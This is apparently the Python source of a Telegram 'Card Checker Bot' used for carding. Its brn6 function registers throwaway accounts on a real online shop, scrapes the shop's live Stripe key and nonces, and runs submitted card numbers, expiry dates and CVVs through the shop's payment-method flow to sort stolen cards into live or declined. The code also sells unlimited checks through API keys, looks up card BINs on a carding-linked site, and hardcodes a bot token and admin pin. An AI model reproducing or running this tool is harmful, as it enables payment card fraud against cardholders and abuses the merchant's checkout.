import requests
import re
import time
import telebot
from telebot import types
import os
import base64
import user_agent
import json
from datetime import datetime, timedelta
import threading
from collections import defaultdict

# Bot Setup
bot = telebot.TeleBot('8013822756:AAEq28T0zQFlUf_w3QXIcgIep4Sd4g3_Fc0')

# Rate limiting and user management
user_checks = defaultdict(int)
user_last_check = defaultdict(float)
user_api_keys = {}
user_daily_checks = defaultdict(int)
last_reset_date = datetime.now().date()
banned_users = set()
admin_pin = "111020"

# Data storage files
USERS_FILE = "users_data.json"
API_KEYS_FILE = "api_keys.json"

# Load existing data
def load_data():
    global user_daily_checks, user_api_keys, banned_users
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                user_daily_checks.update(data.get('daily_checks', {}))
                banned_users = set(data.get('banned_users', []))
    except:
        pass
    
    try:
        if os.path.exists(API_KEYS_FILE):
            with open(API_KEYS_FILE, 'r') as f:
                user_api_keys = json.load(f)
    except:
        pass

def save_data():
    data = {
        'daily_checks': dict(user_daily_checks),
        'banned_users': list(banned_users)
    }
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f)
    
    with open(API_KEYS_FILE, 'w') as f:
        json.dump(user_api_keys, f)

# Reset daily checks
def reset_daily_checks():
    global last_reset_date
    current_date = datetime.now().date()
    if current_date != last_reset_date:
        user_daily_checks.clear()
        last_reset_date = current_date
        save_data()

# API Key verification
def verify_api_key(api_key, user_id):
    url = "https://gqvqvsbpszgbottgtcrf.supabase.co/functions/v1/verify-api-key"
    headers = {"Content-Type": "application/json"}
    data = {"api_key": api_key}
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get('valid'):
                # Check if API key is already bound to another user
                for uid, key in user_api_keys.items():
                    if key == api_key and uid != user_id:
                        return False, "This API key is already registered to another user"
                
                user_api_keys[user_id] = api_key
                save_data()
                return True, "API key verified successfully! You now have unlimited access."
            else:
                return False, "Invalid API key"
        else:
            return False, "API verification service unavailable"
    except Exception as e:
        return False, f"Error verifying API key: {str(e)}"

# Check if user has access
def check_user_access(user_id):
    if user_id in banned_users:
        return False, "You are banned from using this bot."
    
    reset_daily_checks()
    
    # Users with API keys have unlimited access
    if user_id in user_api_keys:
        return True, "unlimited"
    
    # Free users: 20 checks per day
    if user_daily_checks.get(user_id, 0) >= 20:
        return False, "Daily limit reached. Get unlimited access with an API key from apis.devmaxwell.site"
    
    return True, "free"

# Rate limiting: 2 checks per minute
def check_rate_limit(user_id):
    current_time = time.time()
    if current_time - user_last_check.get(user_id, 0) < 30:  # 30 seconds between checks
        return False
    user_last_check[user_id] = current_time
    return True

# Card validation function
def reg(card_details):
    pattern = r'^\d{16}\|\d{2}\|\d{4}\|\d{3}$'
    if re.match(pattern, card_details):
        return card_details
    return 'None'

# Stripe checking function (same as before)
def brn6(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        r = requests.Session()
        generated_user_agent = user_agent.generate_user_agent()
        
        # Request 1: Get Register Nonce
        headers1 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://shop.wiseacrebrew.com/',
            'user-agent': generated_user_agent,
        }
        response1 = r.get('https://shop.wiseacrebrew.com/account/', headers=headers1)
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response1.text).group(1)
        
        # Request 2: Register User
        headers2 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/',
            'user-agent': generated_user_agent,
        }
        data2 = {
            'email': f'testuser{int(time.time())}@example.com',
            'password': 'somepassword123',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/account/',
            'register': 'Register',
        }
        r.post('https://shop.wiseacrebrew.com/account/', headers=headers2, data=data2)
        
        # Request 3: Get Payment Method Page
        headers3 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://shop.wiseacrebrew.com/account/',
            'user-agent': generated_user_agent,
        }
        response3 = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/', headers=headers3)
        nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response3.text).group(1)
        key = re.search(r'"key":"(pk_live_[^"]+)"', response3.text).group(1)
        
        # Request 4: Stripe API
        headers4 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': generated_user_agent,
        }
        data4 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&key={key}'
        response4 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers4, data=data4)
        
        if 'error' in response4.json():
            error_message = response4.json()['error'].get('message', 'Stripe API Error')
            return f"Declined ({error_message})"
            
        tok = response4.json()['id']
        
        # Request 5: Final Confirmation
        headers5 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': generated_user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        params5 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data5 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': tok,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        response5 = r.post('https://shop.wiseacrebrew.com/', params=params5, headers=headers5, data=data5)
        
        msg = response5.text
        if 'succeeded' in msg or 'requires_capture' in msg:
            return 'Approved'
        else:
            decline_match = re.search(r'"message":"([^"]+)"', msg)
            if decline_match:
                return f"Declined ({decline_match.group(1)})"
            return 'Declined'

    except Exception as e:
        print(f"Error during check: {e}")
        return 'Error (Check failed)'

# Start command with welcome message
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Create keyboard with buttons
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🔍 Check Card')
    btn2 = types.KeyboardButton('📊 My Stats')
    btn3 = types.KeyboardButton('🔑 Add API Key')
    btn4 = types.KeyboardButton('ℹ️ Help')
    markup.add(btn1, btn2, btn3, btn4)
    
    welcome_text = """
🤖 *Welcome to Card Checker Bot* 🚀

*Features:*
• 🔍 Instant card validation
• 📊 Real-time BIN information
• 🌍 Country & Bank detection
• ⚡ Fast and reliable

*How to Use:*
1. Send card in format: `XXXXXXXXXXXXXXXX|MM|YYYY|CVV`
2. Or use buttons below for easy navigation

*Limits:*
• Free: 20 checks per day
• Rate: 2 checks per minute
• Unlimited: With API key

Get your API key from: apis.devmaxwell.site

*Commands:*
/start - Show this message
/st [card] - Check card
/stats - Your usage statistics
/apikey [key] - Add API key
/help - Get help
    """
    
    bot.send_message(message.chat.id, welcome_text, 
                    parse_mode="Markdown", reply_markup=markup)

# Help command
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
*🆘 Help Guide*

*Card Format:*
`1234567812345678|12|2025|123`

*Buttons:*
• 🔍 Check Card - Start card checking
• 📊 My Stats - View your usage
• 🔑 Add API Key - Register API key
• ℹ️ Help - This message

*Need Unlimited Access?*
Visit: apis.devmaxwell.site
Get your API key and use /apikey YOUR_KEY

*Support:* @manrsx
    """
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

# Stats command
@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    access, message_type = check_user_access(user_id)
    
    if access:
        if message_type == "unlimited":
            status = "🌟 *Premium User* (Unlimited)"
        else:
            checks_used = user_daily_checks.get(user_id, 0)
            checks_left = 20 - checks_used
            status = f"🆓 *Free User* ({checks_used}/20 used, {checks_left} left)"
        
        stats_text = f"""
*📊 Your Statistics*

{status}
*User ID:* `{user_id}`
*Username:* @{message.from_user.username or 'N/A'}

*Daily Reset:* Every 24 hours
*Rate Limit:* 2 checks per minute
        """
        bot.send_message(message.chat.id, stats_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ " + message_type)

# API key command
@bot.message_handler(commands=['apikey'])
def api_key_command(message):
    try:
        api_key = message.text.split()[1]
    except IndexError:
        bot.send_message(message.chat.id, "❌ Please provide an API key: `/apikey YOUR_KEY`", parse_mode="Markdown")
        return
    
    user_id = message.from_user.id
    success, msg = verify_api_key(api_key, user_id)
    
    if success:
        bot.send_message(message.chat.id, f"✅ {msg}")
    else:
        bot.send_message(message.chat.id, f"❌ {msg}")

# Card checking handler
@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or 
                    message.text.lower().startswith('/st') or
                    message.text == '🔍 Check Card')
def respond_to_vbv(message):
    user_id = message.from_user.id
    
    # Check if user is banned
    if user_id in banned_users:
        bot.send_message(message.chat.id, "❌ You are banned from using this bot.")
        return
    
    # Check rate limiting
    if not check_rate_limit(user_id):
        bot.send_message(message.chat.id, "⏳ Please wait 30 seconds between checks.")
        return
    
    # Check daily limits
    access, msg = check_user_access(user_id)
    if not access:
        bot.send_message(message.chat.id, f"❌ {msg}")
        return
    
    gate = '𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝🔁'
    ko = bot.reply_to(message, "⏳ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...").message_id
    
    # Get card details
    if message.text == '🔍 Check Card':
        # Ask for card details
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
                             text="📝 Please reply with your card in format:\n`1234567812345678|12|2025|123`", 
                             parse_mode="Markdown")
        return
    
    cc_text = message.reply_to_message.text if message.reply_to_message else message.text
    if cc_text.lower().startswith(('.st', '/st')):
        parts = cc_text.split(maxsplit=1)
        cc_text = parts[1] if len(parts) > 1 else ''

    cc = str(reg(cc_text))
    
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
                             text='''<b>🚫 Invalid Format!</b>
Please use: <code>XXXXXXXXXXXXXXXX|MM|YYYY|CVV</code>''', 
                             parse_mode="HTML")
        return

    start_time = time.time()
    last = brn6(cc)
    
    # Increment check count for free users
    if user_id not in user_api_keys:
        user_daily_checks[user_id] = user_daily_checks.get(user_id, 0) + 1
        save_data()
    
    try:
        data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
    except:
        data = {}

    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', '🏳️')
    bank = data.get('bank', 'Unknown')
    end_time = time.time()
    execution_time = end_time - start_time

    if last == 'Approved':
        msg = f'''<b>✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {card_type} - {brand}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bank}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {country} {country_flag}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @manrsx'''
    else:
        msg = f'''<b>❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {card_type} - {brand}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bank}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {country} {country_flag}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @manrsx'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

# Admin panel
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    # Add your admin user IDs here
    admin_ids = [123456789]  # Replace with actual admin IDs
    
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "❌ Access denied.")
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('👥 Users List')
    btn2 = types.KeyboardButton('🚫 Ban User')
    btn3 = types.KeyboardButton('✅ Unban User')
    btn4 = types.KeyboardButton('📊 Statistics')
    btn5 = types.KeyboardButton('🔙 Main Menu')
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, "🔧 *Admin Panel*", 
                    parse_mode="Markdown", reply_markup=markup)

# Handle button responses
@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.from_user.id
    
    if message.text == '📊 My Stats':
        stats_command(message)
    elif message.text == '🔑 Add API Key':
        bot.send_message(message.chat.id, "🔑 Send your API key in format:\n`/apikey your_key_here`", parse_mode="Markdown")
    elif message.text == 'ℹ️ Help':
        help_command(message)
    elif message.text == '🔍 Check Card':
        respond_to_vbv(message)
    elif message.text == '🔙 Main Menu':
        send_welcome(message)

# Background task to reset daily checks
def background_reset():
    while True:
        reset_daily_checks()
        time.sleep(3600)  #Check every hour

# Start background thread
reset_thread = threading.Thread(target=background_reset, daemon=True)
reset_thread.start()

# Load data on startup
load_data()

print("🤖 Bot Started Successfully!")
print("📊 Features loaded:")
print("   • Rate limiting (2 checks/minute)")
print("   • Daily limits (20 free checks)")
print("   • API key verification")
print("   • Admin panel")
print("   • User management")
print("   • Data persistence")

bot.polling()
